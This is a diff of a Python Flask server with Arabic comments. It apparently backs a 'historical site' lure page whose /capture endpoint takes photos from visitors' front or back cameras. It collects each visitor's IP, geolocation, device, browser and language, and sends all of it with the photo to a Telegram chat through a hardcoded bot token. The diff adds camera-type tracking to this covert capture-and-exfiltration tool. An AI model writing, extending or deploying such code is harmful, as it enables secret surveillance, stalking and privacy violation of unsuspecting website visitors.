@@ -7,18 +7,18 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# التوكن ومعرف الدردشة
+# ⚠️ أدخل التوكن و Chat ID الخاصين بك هنا ⚠️
 TOKEN = "8877750705:AAHSSXX_VU39r_LwcxvE9tB_xe3cTqL990A"
-CHAT_ID = 821436485  # ضع الرقم الصحيح من userinfobot
+CHAT_ID = 821436485  # استبدله بالرقم الصحيح الذي حصلت عليه من @userinfobot
 
 bot = TeleBot(TOKEN)
 
 def get_location_from_ip(ip):
-    """الحصول على الموقع الجغرافي من IP باستخدام ip-api.com (مجاني، بدون مفتاح)"""
+    """الحصول على الموقع الجغرافي من IP باستخدام ip-api.com"""
     try:
-        # تجاهل الـ IP الخاص بالـ localhost أو الـ private
+        # تجاهل الـ IP الخاص (localhost / private)
         if ip.startswith('127.') or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
-            return "محمي (خاص)"
+            return "محمي (شبكة خاصة)"
         response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city,regionName,lat,lon', timeout=5)
         data = response.json()
         if data.get('status') == 'success':
@@ -27,15 +27,18 @@ def get_location_from_ip(ip):
             country = data.get('country', 'غير معروف')
             lat = data.get('lat', '')
             lon = data.get('lon', '')
-            return f"{city}, {region}, {country} (📍 {lat}, {lon})" if lat else f"{city}, {region}, {country}"
-        else:
-            return "غير متاح"
+            if lat and lon:
+                return f"{city}, {region}, {country} (📍 {lat}, {lon})"
+            else:
+                return f"{city}, {region}, {country}"
+        return "غير متاح"
     except Exception as e:
         print("خطأ في تحديد الموقع:", e)
         return "غير متاح"
 
 @app.route('/')
 def index():
+    """الصفحة الرئيسية للموقع التاريخي"""
     return send_from_directory('templates', 'index.html')
 
 @app.route('/capture', methods=['POST'])
@@ -53,7 +56,7 @@ def capture():
         if client_ip and ',' in client_ip:
             client_ip = client_ip.split(',')[0].strip()
 
-        # الحصول على الموقع الجغرافي من IP
+        # الحصول على الموقع الجغرافي
         location = get_location_from_ip(client_ip)
 
         # معلومات الجهاز من الجافاسكريبت
@@ -62,9 +65,10 @@ def capture():
         browser = device.get('browser', 'غير معروف')
         screen = device.get('screen', 'غير معروف')
         language = device.get('language', 'غير معروف')
+        camera_type = data.get('camera', 'unknown')  # 'front' أو 'back'
 
-        # بناء رسالة جميلة
-        msg = f"<b>📸 صورة من زائر الموقع</b>\n"
+        # بناء رسالة الصورة
+        msg = f"<b>📸 صورة من زائر الموقع ({camera_type})</b>\n"
         msg += f"🌐 <b>IP:</b> <code>{client_ip}</code>\n"
         msg += f"📍 <b>الموقع:</b> {location}\n"
         msg += f"💻 <b>الجهاز:</b> {os_name} | {browser}\n"
@@ -72,11 +76,11 @@ def capture():
         msg += f"🗣️ <b>اللغة:</b> {language}\n"
         msg += f"🕒 <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
 
-        # إرسال الصورة مع النص
+        # إرسال الصورة والنص إلى التيليغرام
         bot.send_photo(CHAT_ID, img_data, caption=msg, parse_mode='HTML')
         return jsonify({"status": "sent"})
     except Exception as e:
-        print("❌ خطأ:", e)
+        print("❌ خطأ في السيرفر:", e)
         return jsonify({"status": "error", "msg": str(e)}), 500
 
 if __name__ == '__main__':
